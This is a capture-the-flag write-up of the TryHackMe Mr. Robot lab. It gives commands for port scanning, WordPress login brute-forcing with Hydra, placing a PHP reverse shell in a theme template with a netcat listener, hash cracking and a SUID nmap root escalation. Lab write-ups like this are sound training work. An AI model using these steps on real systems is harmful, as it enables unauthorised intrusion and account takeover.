# TryHackMe: Mr. Robot Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Penetration%20Testing-green)

A complete walkthrough of the **Mr. Robot** machine on TryHackMe. This writeup documents the reconnaissance, WordPress enumeration, credential brute-forcing, remote code execution through a theme template, offline hash cracking, and privilege escalation through an outdated SUID binary.

---

## Table of Contents

- [Overview](#overview)
- [Environment](#environment)
- [Attack Summary](#attack-summary)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Credential Brute-Forcing](#3-credential-brute-forcing)
- [4. Initial Access](#4-initial-access)
- [5. Shell Stabilization](#5-shell-stabilization)
- [6. Lateral Movement](#6-lateral-movement)
- [7. Privilege Escalation](#7-privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

| Field        | Value                              |
|--------------|------------------------------------|
| Machine      | Mr. Robot                          |
| Platform     | TryHackMe                          |
| Difficulty   | Medium                             |
| Target IP    | `10.48.138.66`                     |
| OS           | Ubuntu Linux 20.04                 |
| Application  | WordPress on Apache                |
| Objective    | Obtain all three keys              |

---

## Environment

| Component         | Details                       |
|-------------------|-------------------------------|
| Attacker Machine  | Kali Linux                    |
| Attacker IP       | `192.168.136.156`             |
| Target            | `10.48.138.66`                |

---

## Attack Summary

The attack chain progresses through the following stages:

1. **Port scanning** revealed SSH (22), HTTP (80), and HTTPS (443).
2. **Directory enumeration** identified a WordPress installation and a publicly readable `robots.txt`.
3. **robots.txt** disclosed a password dictionary and the first key.
4. **Credential brute-forcing** against the WordPress login recovered a valid username and password.
5. **Remote code execution** was achieved by replacing a theme template with a PHP reverse shell.
6. **Lateral movement** to the user `robot` was achieved by cracking an MD5 hash stored in a readable file.
7. **Privilege escalation** exploited an outdated `nmap` binary with the SUID bit set, using its interactive mode to spawn a root shell.

---

## 1. Reconnaissance

### 1.1 Full TCP Port Scan

```bash
nmap -p- -v 10.48.138.66
```

**Results:**

| Port | State | Service | Notes                       |
|------|-------|---------|-----------------------------|
| 22   | open  | ssh     | OpenSSH 8.2p1 (Ubuntu)      |
| 80   | open  | http    | Apache httpd                |
| 443  | open  | https   | Apache httpd with TLS       |

### 1.2 Service and Version Detection

```bash
nmap -sC -sV -p 22,80,443 10.48.138.66
```

Key findings:

- **HTTP and HTTPS:** Both serve the same Apache site. The TLS certificate is a self-signed default certificate for `www.example.com`, which is not useful for virtual host discovery.
- **SSH (22):** OpenSSH 8.2p1 on Ubuntu, a potential target once valid credentials are found.

---

## 2. Web Enumeration

### 2.1 Directory Enumeration

```bash
gobuster dir -u http://10.48.138.66/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```
/index.php            (Status: 301) --> http://10.48.138.66/
/xmlrpc.php           (Status: 405)
/wp-login.php         (Status: 200)
/wp-register.php      (Status: 301) --> http://10.48.138.66/wp-login.php?action=register
/index.html           (Status: 200)
/favicon.ico          (Status: 200)
/readme.html          (Status: 200)
/.htaccess            (Status: 403)
/license.txt          (Status: 200)
/robots.txt           (Status: 200)
```

The presence of `wp-login.php`, `xmlrpc.php`, and `readme.html` confirmed that the site runs WordPress.

### 2.2 Reviewing robots.txt

The `robots.txt` file disclosed two resources that were not intended for public access:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

- `key-1-of-3.txt` is the first key of the challenge.
- `fsocity.dic` is a password dictionary that contains a large number of duplicate entries.

Retrieving the dictionary file made it available for offline use:

```bash
wget http://10.48.138.66/fsocity.dic
```

---

## 3. Credential Brute-Forcing

### 3.1 Preparing the Wordlist

The dictionary contains many repeated entries, which would slow the attack considerably. It was reduced to unique values before use:

```bash
sort -u fsocity.dic > fs-list
```

### 3.2 Identifying the Username

The WordPress login page returns the message "The password you entered for the username ... is incorrect" when the username is valid. This response difference was used to confirm the account name `elliot`.

### 3.3 Brute-Forcing the Password

Hydra was used against the login form with the failure message as the detection string:

```bash
hydra -l elliot -P fs-list 10.48.138.66 http-post-form \
      "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" \
      -t 30
```

Hydra returned the password for `elliot`, which allowed authenticated access to the WordPress dashboard.

> Credential values are not reproduced in this public writeup.

---

## 4. Initial Access

### 4.1 Uploading a Reverse Shell through the Theme Editor

After logging in, the theme editor under **Appearance** was used to add a PHP reverse shell to a template in the active `twentyfifteen` theme.

Requesting the theme file caused the PHP code to execute on the server:

```
http://10.48.138.66/wp-content/themes/twentyfifteen/archive.php
```

A listener was started on the attacker machine:

```bash
nc -lvnp 5555
```

```
connect to [192.168.136.156] from (UNKNOWN) [10.48.138.66] 60150
Linux ip-10-48-138-66 5.15.0-139-generic #149~20.04.1-Ubuntu SMP x86_64 GNU/Linux
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@ip-10-48-138-66:/$
```

---

## 5. Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background the listener
stty raw -echo
fg
export TERM=xterm-256color
```

---

## 6. Lateral Movement

### 6.1 Discovering Readable Files

The home directory of the user `robot` contained the second key and a password hash file:

```bash
cd /home/robot
ls
cat key-2-of-3.txt
# cat: key-2-of-3.txt: Permission denied
cat password.raw-md5
```

```
robot:c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

The second key was not readable as `daemon`. The file `password.raw-md5` contained an MD5 hash for the `robot` account.

### 6.2 Cracking the MD5 Hash

The hash was submitted to an online lookup service (CrackStation), which returned the plaintext password for `robot`.

### 6.3 Switching to robot

```bash
su robot
Password: <recovered-password>
```

```bash
robot@ip-10-48-138-66:~$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@ip-10-48-138-66:~$ cat key-2-of-3.txt
```

---

## 7. Privilege Escalation

### 7.1 Searching for SUID Binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

The search returned `/usr/local/bin/nmap` with the SUID bit set. This is unusual for a system utility, and the binary is an old release that supports interactive mode.

### 7.2 Spawning a Root Shell with nmap

Older versions of `nmap` provide an interactive mode that allows shell commands to be executed. Because the binary runs with root privileges through SUID, the shell inherits root access:

```bash
/usr/local/bin/nmap --interactive
```

```
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
root@ip-10-48-138-66:~#
```

### 7.3 Root Flag

```bash
cd /root
ls
# firstboot_done  key-3-of-3.txt
cat key-3-of-3.txt
```

---

## Flags

| Flag            | Location                       | Value         |
|-----------------|--------------------------------|---------------|
| `key-1-of-3.txt`| Web root (linked from robots.txt) | `<key-1>`   |
| `key-2-of-3.txt`| `/home/robot/key-2-of-3.txt`   | `<key-2>`     |
| `key-3-of-3.txt`| `/root/key-3-of-3.txt`         | `<key-3>`     |

> Flag values are intentionally omitted from this public writeup in accordance with TryHackMe guidelines.

---

## Lessons Learned

- **Do not list sensitive files in robots.txt.** The file was intended to keep crawlers out of certain paths, but it effectively advertised the password dictionary and the first key to anyone who read it.
- **Enforce account lockout and rate limiting on login forms.** Brute-forcing the WordPress login succeeded because no meaningful throttling was in place.
- **Restrict who can edit theme files.** Access to the theme editor allowed arbitrary PHP code to be stored and executed on the server.
- **Avoid MD5 for password storage.** MD5 is fast to compute and is available in precomputed lookup tables, so a hash stored in a readable file is trivially recovered.
- **Protect user home directories.** Files left in `/home/robot` were readable by the `daemon` account, which exposed the password hash.
- **Audit SUID binaries regularly.** Setting the SUID bit on an interactive, outdated utility such as `nmap` gives any user who can execute it a direct route to root.

---

## Tools Used

| Tool        | Purpose                                              |
|-------------|------------------------------------------------------|
| Nmap        | Port scanning and service fingerprinting             |
| Gobuster    | Web directory enumeration                            |
| Hydra       | Brute-forcing the WordPress login form               |
| Netcat      | Reverse shell listener                               |
| Python 3    | Shell upgrade to a fully interactive TTY             |
| CrackStation| Online lookup for the MD5 hash                       |

---

## References

- [TryHackMe: Mr. Robot](https://tryhackme.com/)
- [WordPress Documentation](https://wordpress.org/documentation/)
- [GTFOBins: nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## Disclaimer

This writeup is intended solely for educational purposes and was performed in a legal, authorized lab environment provided by TryHackMe. The techniques described should only be used against systems where you have explicit written permission to test.

# Jai Shri Ram
